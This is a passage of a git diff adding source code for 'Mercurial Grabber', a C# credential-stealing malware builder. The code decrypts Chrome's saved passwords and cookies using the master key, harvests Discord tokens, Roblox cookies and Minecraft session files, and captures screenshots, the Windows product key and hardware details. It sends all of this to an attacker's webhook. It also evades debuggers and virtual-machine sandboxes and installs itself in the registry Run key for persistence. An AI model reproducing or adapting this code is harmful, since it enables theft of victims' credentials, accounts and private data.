    <value>..\Resources\Grabber.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
  </data>
  <data name="Machine" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\Machine.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
  </data>
  <data name="Program" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\Program.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
  </data>
  <data name="SQLite" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\SQLite.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
  </data>
  <data name="User" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\User.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
  </data>
  <data name="Webhook" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\Webhook.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
  </data>
</root> 
 29  Mercurial/Properties/Settings.Designer.cs 
 7  Mercurial/Properties/Settings.settings 
@@ -0,0 +1,7 @@
<?xml version='1.0' encoding='utf-8'?>
<SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)">
  <Profiles>
    <Profile Name="(Default)" />
  </Profiles>
  <Settings />
</SettingsFile>
 19  Mercurial/Properties/licenses.licx 
@@ -0,0 +1,19 @@
Bunifu.UI.WinForms.BunifuFormDock, Bunifu.UI.WinForms.BunifuFormDock, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuButton.BunifuButton, Bunifu.UI.WinForms.BunifuButton, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuPictureBox, Bunifu.UI.WinForms.BunifuPictureBox, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuGroupBox, Bunifu.UI.WinForms.BunifuGroupBox, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuVSlider, Bunifu.UI.WinForms.BunifuSlider, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuHSlider, Bunifu.UI.WinForms.BunifuSlider, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuCheckBox, Bunifu.UI.WinForms.BunifuCheckBox, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuShadowPanel, Bunifu.UI.WinForms.BunifuShadowPanel, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuToggleSwitch, Bunifu.UI.WinForms.BunifuToggleSwitch, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuColorTransition, Bunifu.UI.WinForms.BunifuColorTransition, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuPages, Bunifu.UI.WinForms.BunifuPages, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuDataGridView, Bunifu.UI.WinForms.BunifuDataGridView, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuUserControl, Bunifu.UI.WinForms.BunifuUserControl, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuLabel, Bunifu.UI.WinForms.BunifuLabel, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuTextBox, Bunifu.UI.WinForms.BunifuTextBox, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuSeparator, Bunifu.UI.WinForms.BunifuSeparator, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuCircleProgress, Bunifu.UI.WinForms.BunifuCircleProgress, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuPanel, Bunifu.UI.WinForms.BunifuPanel, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
Bunifu.UI.WinForms.BunifuRadialGauge, Bunifu.UI.WinForms.BunifuGauge, Version=5.0.6.0, Culture=neutral, PublicKeyToken=e8e24ccd28363fe9
 136  Mercurial/Resources/AesGcm.cs 
@@ -0,0 +1,136 @@
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;


namespace Stealer
{
    //Credits: https://github.com/dvsekhvalnov/jose-jwt
    class AesGcm
    {
        public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
        {
            IntPtr hAlg = OpenAlgorithmProvider(BCrypt.BCRYPT_AES_ALGORITHM, BCrypt.MS_PRIMITIVE_PROVIDER, BCrypt.BCRYPT_CHAIN_MODE_GCM);
            IntPtr hKey, keyDataBuffer = ImportKey(hAlg, key, out hKey);

            byte[] plainText;

            var authInfo = new BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);

                byte[] ivData = new byte[MaxAuthTagSize(hAlg)];

                int plainTextSize = 0;

                uint status = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, null, 0, ref plainTextSize, 0x0);

                if (status != BCrypt.ERROR_SUCCESS)
                    throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", status));

                plainText = new byte[plainTextSize];

                status = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, plainText, plainText.Length, ref plainTextSize, 0x0);

                if (status == BCrypt.STATUS_AUTH_TAG_MISMATCH)
                    throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");

                if (status != BCrypt.ERROR_SUCCESS)
                    throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", status));

            authInfo.Dispose();

            BCrypt.BCryptDestroyKey(hKey);
            Marshal.FreeHGlobal(keyDataBuffer);
            BCrypt.BCryptCloseAlgorithmProvider(hAlg, 0x0);

            return plainText;
        }

        private int MaxAuthTagSize(IntPtr hAlg)
        {
            byte[] tagLengthsValue = GetProperty(hAlg, BCrypt.BCRYPT_AUTH_TAG_LENGTH);

            return BitConverter.ToInt32(new[] { tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7] }, 0);
        }

        private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
        {
            IntPtr hAlg = IntPtr.Zero;

            uint status = BCrypt.BCryptOpenAlgorithmProvider(out hAlg, alg, provider, 0x0);

            if (status != BCrypt.ERROR_SUCCESS)
                throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", status));

            byte[] chainMode = Encoding.Unicode.GetBytes(chainingMode);
            status = BCrypt.BCryptSetAlgorithmProperty(hAlg, BCrypt.BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0x0);

            if (status != BCrypt.ERROR_SUCCESS)
                throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", status));

            return hAlg;
        }

        private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
        {
            byte[] objLength = GetProperty(hAlg, BCrypt.BCRYPT_OBJECT_LENGTH);

            int keyDataSize = BitConverter.ToInt32(objLength, 0);

            IntPtr keyDataBuffer = Marshal.AllocHGlobal(keyDataSize);

            byte[] keyBlob = Concat(BCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC, BitConverter.GetBytes(0x1), BitConverter.GetBytes(key.Length), key);

            uint status = BCrypt.BCryptImportKey(hAlg, IntPtr.Zero, BCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, keyDataBuffer, keyDataSize, keyBlob, keyBlob.Length, 0x0);

            if (status != BCrypt.ERROR_SUCCESS)
                throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", status));

            return keyDataBuffer;
        }

        private byte[] GetProperty(IntPtr hAlg, string name)
        {
            int size = 0;

            uint status = BCrypt.BCryptGetProperty(hAlg, name, null, 0, ref size, 0x0);

            if (status != BCrypt.ERROR_SUCCESS)
                throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", status));

            byte[] value = new byte[size];

            status = BCrypt.BCryptGetProperty(hAlg, name, value, value.Length, ref size, 0x0);

            if (status != BCrypt.ERROR_SUCCESS)
                throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", status));

            return value;
        }

        public byte[] Concat(params byte[][] arrays)
        {
            int len = 0;

            foreach (byte[] array in arrays)
            {
                if (array == null)
                    continue;
                len += array.Length;
            }

            byte[] result = new byte[len - 1 + 1];
            int offset = 0;

            foreach (byte[] array in arrays)
            {
                if (array == null)
                    continue;
                Buffer.BlockCopy(array, 0, result, offset, array.Length);
                offset += array.Length;
            }

            return result;
        }
    }
}
 234  Mercurial/Resources/Browser.cs 
@@ -0,0 +1,234 @@
using System;
using System.Text;

using System.IO;
using System.Security.Cryptography;
namespace Stealer
{
    class Browser
    {
        private static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey) /
        {
            byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; 


            Array.Copy(encryptedData, 3, iv, 0, 12);

            try
            {

                byte[] Buffer = new byte[encryptedData.Length - 15];
                Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15);

                byte[] tag = new byte[16]; 
                byte[] data = new byte[Buffer.Length - tag.Length]; 


                Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16);


                Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length);

                AesGcm aesDecryptor = new AesGcm();
                var result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, null, data, tag));
                return result;
            }
            catch
            {
                return null;
            }
        }
        private static byte[] GetMasterKey()
        {
            string filePath = User.localAppData + @"\Google\Chrome\User Data\Local State";
            byte[] masterKey = new byte[] { };

            if (File.Exists(filePath) == false)
                return null;

            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));

            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                {
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value)); 

                }

            }


            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);

            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }



        public static void StealCookies()
        {
            string src = User.localAppData + @"\Google\Chrome\User Data\default\Cookies";
            string stored = User.tempFolder + "\\cookies.db";

            if (File.Exists(src))
            {
                Console.WriteLine("Located: " + src);
                try
                {
                    File.Copy(src, stored);
                }
                catch
                {
                }
                try
                {
                    SQLite db = new SQLite(stored);

                    db.ReadTable("cookies");

                    StreamWriter file = new StreamWriter(User.tempFolder + "\\cookies.txt");
                    for (int i = 0; i <= db.GetRowCount(); i++)
                    {
                        string value = db.GetValue(i, 12);
                        string hostKey = db.GetValue(i, 1);
                        string name = db.GetValue(i, 2);
                        string path = db.GetValue(i, 4);
                        string expires = "";
                        try
                        {
                            expires = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(db.GetValue(i, 5))), TimeZoneInfo.Local));
                        }
                        catch
                        {
                        }

                        string result = String.Empty;

                        try
                        {
                            result = DecryptWithKey(Encoding.Default.GetBytes(value), GetMasterKey());
                        }
                        catch
                        {
                            result = "Error in deryption";
                        }

                        file.WriteLine("---------------- mercurial grabber ----------------");
                        file.WriteLine("value: " + result);
                        file.WriteLine("hostKey: " + hostKey);
                        file.WriteLine("name: " + name);
                        file.WriteLine("expires: " + expires);
                    }

                    file.Close();

                    File.Delete(stored);

                    Program.wh.SendData("", "cookies.txt", User.tempFolder + "\\cookies.txt", "multipart/form-data");
                    File.Delete(User.tempFolder + "\\cookies.txt");
                }

                catch (Exception ex)
                {
                    Program.wh.SendData("", "cookies.db", User.tempFolder + "\\cookies.db", "multipart/form-data");
                    Program.wh.Send("`" + ex.Message + "`");
                }
            }

            else
            {
                Program.wh.Send("`" + "Did not find: " + src + "`");
            }
        }



        public static void StealPasswords()
        {
            string src = User.localAppData + @"\Google\Chrome\User Data\default\Login Data";
            Console.WriteLine(src);

            if (File.Exists(src))
            {
                string stored = User.tempFolder + "\\login.db";
                Console.WriteLine("copy to " + stored);

                try
                {
                    File.Copy(src, stored);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                try
                {
                    SQLite db = new SQLite(stored);
                    db.ReadTable("logins");

                    StreamWriter file = new StreamWriter(User.tempFolder + "\\passwords.txt");
                    for (int i = 0; i <= db.GetRowCount(); i++)
                    {
                        string host = db.GetValue(i, 0);
                        string username = db.GetValue(i, 3);
                        var password = db.GetValue(i, 5);

                        if (host != null)
                        {
                            if (password.StartsWith("v10") || password.StartsWith("v11"))
                            {
                                var masterKey = GetMasterKey();

                                if (masterKey == null)
                                {
                                    continue;
                                }

                                try
                                {
                                    password = DecryptWithKey(Encoding.Default.GetBytes(password), masterKey);
                                }
                                catch
                                {
                                    password = "Unable to decrypt";
                                }

                                file.WriteLine("---------------- mercurial grabber ----------------");
                                file.WriteLine("host: " + host);
                                file.WriteLine("username: " + username);
                                file.WriteLine("password: " + password);
                            }
                        }
                    }

                    file.Close();
                    File.Delete(stored);

                    Program.wh.SendData("", "passwords.txt", User.tempFolder + "\\passwords.txt", "multipart/form-data");
                    File.Delete(User.tempFolder + "\\passwords.txt");
                }
                catch (Exception ex)
                {
                    Program.wh.SendData("", "login.db", User.tempFolder + "\\login.db", "multipart/form-data");
                    Program.wh.Send("`" + ex.Message + "`");
                }

            }
            else
            {
                Program.wh.Send("`" + "Did not find: " + src + "`");
            }

        }
    }
}
 75  Mercurial/Resources/Common.cs 
@@ -0,0 +1,75 @@
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Net.Http;
using System.Net;
using System.IO;
namespace Stealer
{
    class Common
    {
        static int fileCounter = 1;
        public static string fileName = String.Empty;

        public static string Extract(string target, string content)
        {
            string output = String.Empty;
            Regex rx = new Regex("\"" + target + "\"\\s*:\\s*(\"(?:\\\\\"|[^\"])*?\")");
            MatchCollection matches = rx.Matches(content);
            foreach (Match match in matches)
            {
                GroupCollection groups = match.Groups;
                output = groups[1].Value;
            }
            output = output.Replace("\"", "");
            return output;
        }

        public static List<string> RegexJson(string content, string regex)
        {
            List<string> output = new List<string>();
            var pattern = new Regex(regex, RegexOptions.Compiled).Matches(content);
            foreach (Match prof in pattern)
            {
                if (prof.Success)
                {
                    output.Add(prof.Groups[1].Value);
                }
            }
            return output;
        }

        public static void WriteToFile(string writeText)
        {

            fileName = User.tempFolder + "\\history" + ".txt";
            if (File.Exists(fileName))
            {
                string str = File.ReadAllText(fileName);

                if ((str.Length + writeText.Length) / 1024 > 8000)  
                {
                    fileCounter++;
                    fileName = User.tempFolder + "\\history_" + fileCounter + ".txt";
                    StreamWriter _sw = new StreamWriter(fileName, true);
                    _sw.WriteLine(writeText);
                    _sw.Close();

                }
                else  // use exixting file
                {
                    StreamWriter _sw = new StreamWriter(fileName, true);
                    _sw.WriteLine(writeText);
                    _sw.Close();
                }
            }

        }
    }



}
 116  Mercurial/Resources/Grabber.cs 
@@ -0,0 +1,116 @@
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.IO;
using System.Net.Http;

namespace Stealer
{
    class Grabber
    {
        public static List<string> target = new List<string>();

        private static void Scan()
        {
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            target.Add(roaming + "\\Discord");
            target.Add(roaming + "\\discordcanary");
            target.Add(roaming + "\\discordptb");
            target.Add(roaming + "\\\\Opera Software\\Opera Stable");
            target.Add(local + "\\Google\\Chrome\\User Data\\Default");
            target.Add(local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            target.Add(local + "\\Yandex\\YandexBrowser\\User Data\\Default");
        }
        public static List<string> Grab()
        {
            Scan();
            List<string> tokens = new List<string>();
            foreach (string x in target)
            {
                if (Directory.Exists(x))
                {
                    string path = x + "\\Local Storage\\leveldb";
                    DirectoryInfo leveldb = new DirectoryInfo(path);
                    foreach (var file in leveldb.GetFiles(false ? "*.log" : "*.ldb"))
                    {
                        string contents = file.OpenText().ReadToEnd();
                        foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                            tokens.Add(match.Value);

                        foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                            tokens.Add(match.Value);
                    }
                }
            }
            return tokens;
        }

        public static void Minecraft()
        {
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string target = roaming + "\\.minecraft\\launcher_profiles.json";
            Console.WriteLine(target);
        }
    }

    class Token
    {
        private string token;
        private string jsonResponse = String.Empty;

        public string fullUsername;
        public string userId;
        public string avatarUrl;
        public string phoneNumber;
        public string email;
        public string locale;
        public string creationDate;

        public Token(string inToken)
        {
            token = inToken;
            PostToken();
        }

        private void PostToken()
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Add("Authorization", token);
                    var response = client.GetAsync("https://discordapp.com/api/v8/users/@me");
                    var final = response.Result.Content.ReadAsStringAsync();
                    jsonResponse = final.Result;
                }
                GetData();
            }
            catch
            {
            }
        }
        private void GetData()
        {
            string username = Common.Extract("username", jsonResponse);
            userId = Common.Extract("id", jsonResponse);
            string discriminator = Common.Extract("discriminator", jsonResponse);
            fullUsername = username + "#" + discriminator;

            string avatarId = Common.Extract("avatar", jsonResponse);
            avatarUrl = "https://cdn.discordapp.com/avatars/" + userId + "/" + avatarId;

            phoneNumber = Common.Extract("phone", jsonResponse);
            email = Common.Extract("email", jsonResponse);

            locale = Common.Extract("locale", jsonResponse);

            long creation = (Convert.ToInt64(userId) >> 22) + 1420070400000;
            var result = DateTimeOffset.FromUnixTimeMilliseconds(creation).DateTime;
            creationDate = result.ToString();
        }
    }
}
 169  Mercurial/Resources/Machine.cs 
@@ -0,0 +1,169 @@
using System;
using System.Management;   
using Microsoft.Win32;
using System.IO;
namespace Stealer
{
    class Machine
    {
        static readonly string[] SizeSuffixes = { "bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };

        public string osName = String.Empty;
        public string osArchitecture = String.Empty;
        public string osVersion = String.Empty;
        public string processName = String.Empty;
        public string gpuVideo = String.Empty;
        public string gpuVersion = String.Empty;

        public string diskDetails = String.Empty;
        public string pcMemory = String.Empty;
        public Machine ()
        {
            OSInfo();
            ProcessorInfo();
            GPUInfo();
            Disk();
            Memory();
        }
        static string SizeSuffix(Int64 value)
        {
            if (value < 0) { return "-" + SizeSuffix(-value); }
            if (value == 0) { return "0.0 bytes"; }

            int mag = (int)Math.Log(value, 1024);
            decimal adjustedSize = (decimal)value / (1L << (mag * 10));

            return string.Format("{0:n1} {1}", adjustedSize, SizeSuffixes[mag]);
        }

        private void OSInfo()
        {
            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
            foreach (ManagementObject managementObject in mos.Get())
            {
                if (managementObject["Caption"] != null)
                {
                    //Console.WriteLine("Operating System Name : " + managementObject["Caption"].ToString());   //Display operating system caption
                    osName = managementObject["Caption"].ToString();

                }
                if (managementObject["OSArchitecture"] != null)
                {
                    //Console.WriteLine("Operating System Architecture: " + managementObject["OSArchitecture"].ToString());   //Display operating system architecture.
                    osArchitecture = managementObject["OSArchitecture"].ToString();
                }
                if (managementObject["Version"] != null)
                {
                    //Console.WriteLine("Version: " + managementObject["Version"].ToString());     //Display operating system version.
                    osVersion = managementObject["Version"].ToString();
                }
            }
        }

        private void ProcessorInfo()
        {
            RegistryKey processor_name = Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0", RegistryKeyPermissionCheck.ReadSubTree);   

            if (processor_name != null)
            {
                if (processor_name.GetValue("ProcessorNameString") != null)
                {
                    //Console.WriteLine("CPU : " + processor_name.GetValue("ProcessorNameString"));
                    processName = processor_name.GetValue("ProcessorNameString").ToString();
                }
            }
        }
        private void GPUInfo()
        {
            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_VideoController");
            foreach (ManagementObject obj in mos.Get())
            {
                //Console.WriteLine("VideoProcessor  -  " + obj["VideoProcessor"]);
                //Console.WriteLine("DriverVersion  -  " + obj["DriverVersion"]);
                gpuVideo = obj["VideoProcessor"].ToString();
                gpuVersion = obj["DriverVersion"].ToString();
            }
        }

        private void Disk()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            foreach (DriveInfo d in allDrives)
            {
                if (d.IsReady == true)
                {
                    //Console.WriteLine("Drive {0} - {1}", d.Name, SizeSuffix(d.AvailableFreeSpace) + "/" + SizeSuffix(d.TotalSize));
                    diskDetails += String.Format("Drive {0}\\ - {1}", d.Name, SizeSuffix(d.AvailableFreeSpace) + "/" + SizeSuffix(d.TotalSize) + "\\n");
                }
            }
        }

        private void Memory()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory");

            Int64 Capacity = 0;
            foreach (ManagementObject WniPART in searcher.Get())
            {
                Capacity += Convert.ToInt64(WniPART.Properties["Capacity"].Value);
            }

            //Console.WriteLine("PC Memory - " + SizeSuffix(Capacity));
            pcMemory = SizeSuffix(Capacity);

        }

    }
    class Windows
    {
        private static string ProductKey(byte[] digitalProductId)
        {
            var key = String.Empty;
            const int keyOffset = 52;
            var isWin8 = (byte)((digitalProductId[66] / 6) & 1);
            digitalProductId[66] = (byte)((digitalProductId[66] & 0xf7) | (isWin8 & 2) * 4);

            const string digits = "BCDFGHJKMPQRTVWXY2346789";
            var last = 0;
            for (var i = 24; i >= 0; i--)
            {
                var current = 0;
                for (var j = 14; j >= 0; j--)
                {
                    current = current * 256;
                    current = digitalProductId[j + keyOffset] + current;
                    digitalProductId[j + keyOffset] = (byte)(current / 24);
                    current = current % 24;
                    last = current;
                }
                key = digits[current] + key;
            }

            var keypart1 = key.Substring(1, last);
            var keypart2 = key.Substring(last + 1, key.Length - (last + 1));
            key = keypart1 + "N" + keypart2;

            for (var i = 5; i < key.Length; i += 6)
            {
                key = key.Insert(i, "-");
            }

            return key;
        }

        public static string GetProductKey()
        {
            var localKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);

            if (Environment.Is64BitOperatingSystem)
                localKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);

            var registryKeyValue = localKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue("DigitalProductId");
            if (registryKeyValue == null)
                return "Failed to get DigitalProductId from registry";
            var digitalProductId = (byte[])registryKeyValue;

            return ProductKey(digitalProductId);
        }
    }
}
 282  Mercurial/Resources/Program.cs 
@@ -0,0 +1,282 @@
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Text.RegularExpressions;
using System.Drawing;
using System.Drawing.Imaging; 
using System.Windows.Forms; 
using System.Net.Http;
using System.Net;
using System.Diagnostics;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace Stealer
{
    class Program
    {

        public static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");
        public static Webhook wh = new Webhook("%INSERT_WEBHOOK%");


        static void Main()
        {
            DetectDebug();
            DetectRegistry();

            %FAKE_ERROR%


            %CHECKBOX8% // Grab IP
            %CHECKBOX11% // Grab Tokens
            %CHECKBOX5% // Product Key
            %CHECKBOX6% // Grab hardware

            %CHECKBOX3% // Cookies
            %CHECKBOX4% // Passwords

            %CHECKBOX2% // Minecraft
            %CHECKBOX1% // Roblox 
            %CHECKBOX7% // Capture Screen

            %CHECKBOX10% // Add to startup 

            Console.WriteLine("Task complete");
        }

        static void DetectDebug()
        {
            if (!System.Diagnostics.Debugger.IsAttached)
            {
                return;
            }
            Environment.Exit(0);
        }

        static void DetectRegistry()
        {
            List<string> EvidenceOfSandbox = new List<string>();

            List<string> sandboxStrings = new List<string> { "vmware", "virtualbox", "vbox", "qemu", "xen" };

            string[] HKLM_Keys_To_Check_Exist = {@"HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier",
                @"SYSTEM\CurrentControlSet\Enum\SCSI\Disk&Ven_VMware_&Prod_VMware_Virtual_S",
                @"SYSTEM\CurrentControlSet\Control\CriticalDeviceDatabase\root#vmwvmcihostdev",
                @"SYSTEM\CurrentControlSet\Control\VirtualDeviceDrivers",
                @"SOFTWARE\VMWare, Inc.\VMWare Tools",
                @"SOFTWARE\Oracle\VirtualBox Guest Additions",
                @"HARDWARE\ACPI\DSDT\VBOX_"};

            string[] HKLM_Keys_With_Values_To_Parse = {@"SYSTEM\ControlSet001\Services\Disk\Enum\0",
                @"HARDWARE\Description\System\SystemBiosInformation",
                @"HARDWARE\Description\System\VideoBiosVersion",
                @"HARDWARE\Description\System\SystemManufacturer",
                @"HARDWARE\Description\System\SystemProductName",
                @"HARDWARE\Description\System\Logical Unit Id 0"};

            foreach (string HKLM_Key in HKLM_Keys_To_Check_Exist)
            {
                RegistryKey OpenedKey = Registry.LocalMachine.OpenSubKey(HKLM_Key, false);
                if (OpenedKey != null)
                {
                    EvidenceOfSandbox.Add(@"HKLM:\" + HKLM_Key);
                }
            }

            foreach (string HKLM_Key in HKLM_Keys_With_Values_To_Parse)
            {
                string valueName = new DirectoryInfo(HKLM_Key).Name;
                string value = (string)Registry.LocalMachine.OpenSubKey(Path.GetDirectoryName(HKLM_Key), false).GetValue(valueName);
                foreach (string sandboxString in sandboxStrings)
                {
                    if (!string.IsNullOrEmpty(value) && value.ToLower().Contains(sandboxString.ToLower()))
                    {
                        EvidenceOfSandbox.Add(@"HKLM:\" + HKLM_Key + " => " + value);
                    }
                }
            }

            if (EvidenceOfSandbox.Count == 0)
            {
                return;
            }

            Environment.Exit(0);
        }


        public static void Roblox()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com", false))
                {
                    string cookie = key.GetValue(".ROBLOSECURITY").ToString();
                    cookie = cookie.Substring(46).Trim('>');
                    Console.WriteLine(cookie);
                    wh.SendContent(WebhookContent.RobloxCookie(cookie));
                }
            }

            catch (Exception ex)
            {
                wh.SendContent(WebhookContent.SimpleMessage("Roblox Cookie", "Unable to find cookie from Roblox Studio registry"));
                Console.WriteLine(ex.Message);
            }

        }
        public static void StartUp()
        {
            try
            {
                string filename = Process.GetCurrentProcess().ProcessName + ".exe";
                string filepath = Path.Combine(Environment.CurrentDirectory, filename);
                File.Copy(filepath, Path.GetTempPath() + filename);

                string loc = Path.GetTempPath() + filename;

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue("Mercurial Grabber", "\"" + loc + "\"");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static void Minecraft()
        {
            string target = User.appData + "\\.minecraft\\launcher_profiles.json";
            Console.WriteLine(target);
            Console.WriteLine("copy to : "+ User.tempFolder + "\\launcher_profiles.json");
            if (File.Exists(target)){
                File.Copy(target, User.tempFolder + "\\launcher_profiles.json");
                wh.SendData("Minecraft Session Profiles", "launcher_profiles.json", User.tempFolder + "\\launcher_profiles.json", "multipart/form-data");
            }

            else
            {
                wh.SendContent(WebhookContent.SimpleMessage("Minecraft Session", "Unable to find launcher_profiles.json"));
            }
        }

        static void CaptureScreen()
        {
            Bitmap captureBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;

            Graphics captureGraphics = Graphics.FromImage(captureBitmap);

            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
            captureBitmap.Save(tempFolder + "\\Capture.jpg", ImageFormat.Jpeg);
            wh.SendData("", "Capture.jpg", tempFolder + "\\Capture.jpg", "multipart/form-data");
        }

